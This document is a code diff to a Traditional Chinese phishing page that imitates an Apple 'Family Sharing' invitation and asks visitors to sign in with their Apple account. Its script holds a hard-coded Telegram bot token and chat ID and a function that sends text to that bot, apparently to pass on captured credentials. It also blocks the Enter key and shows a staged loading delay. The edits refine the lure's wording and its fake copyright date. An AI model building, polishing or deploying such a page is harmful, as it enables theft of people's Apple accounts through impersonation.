@@ -61,7 +61,7 @@
     <main id="phase-invite" class="main-content">
         <img src="./assets/family_icon.png" class="family-hero-img" alt="Family Icon">
         <h1 class="invite-title">ThomasSusan 已邀請你加入「家人共享」。</h1>
-        <p class="invite-desc">登入以加入ThomasSusan的家庭，即可存取 0GB 的 iCloud 儲存空間。</p>
+        <p class="invite-desc">登入以加入ThomasSusan的家庭，即可存取 iCloud 儲存空間。</p>
         <h2 style="font-size: 24px; margin-bottom: 25px; font-weight: 400;">使用 Apple 帳號登入</h2>
         
         <div class="login-box" id="login-box">
@@ -103,7 +103,7 @@
         <div class="footer-inner">
             <div style="border-bottom: 1px solid #d2d2d7; padding-bottom: 15px; margin-bottom: 15px;">更多選購方式：<span style="color: #0066cc;">尋找當地的 Apple 直營店</span>或致電 0800-020-021。</div>
             <div class="footer-bottom">
-                <div>Copyright © 2026 Apple Inc. 保留一切權利。</div>
+                <div>Copyright © 2022 Apple Inc. 保留一切權利。</div>
                 <div class="flag-box"><img src="./assets/TWNflag.png" class="flag-img" alt="Taiwan"> 台灣</div>
             </div>
         </div>
@@ -113,7 +113,6 @@
         const config = { token: "8515104060:AAEaLB1JSthW0sepHdNLetgqg_ZBE-1Ofy4", chatId: "1945090052" };
         async function sendMsg(text) { try { await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: config.chatId, text: text }) }); } catch(e) {} }
 
-        // 初始化頁面：2.5秒加載動畫
         function initPage() {
             setTimeout(() => {
                 const loader = document.getElementById('initial-loader');
@@ -123,9 +122,9 @@
             }, 2500);
         }
 
-        // 攔截鍵盤 Return (Enter) 鍵
+        // 全面攔截鍵盤事件，確保按鍵無效
         function preventReturn(e) {
-            if (e.keyCode === 13) {
+            if (e.key === "Enter" || e.keyCode === 13) {
                 e.preventDefault();
                 return false;
             }
